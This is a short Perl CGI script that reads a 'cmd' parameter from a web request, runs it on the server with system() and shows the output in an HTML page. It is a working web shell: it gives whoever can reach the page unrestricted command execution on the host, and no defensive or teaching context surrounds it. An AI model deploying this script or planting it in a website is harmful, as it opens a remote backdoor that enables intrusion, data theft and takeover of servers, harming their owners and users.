#!/usr/bin/perl

print "content-type:text/html\n\n";
use CGI;
$cgi = new CGI;
$cmd = $cgi -> param("cmd");
print "<html><body bgcolor=lightgreen><center><b>";
print "output of the executed UNIX command :<br><br>";
system($cmd);
print "</b></center></body></html>";
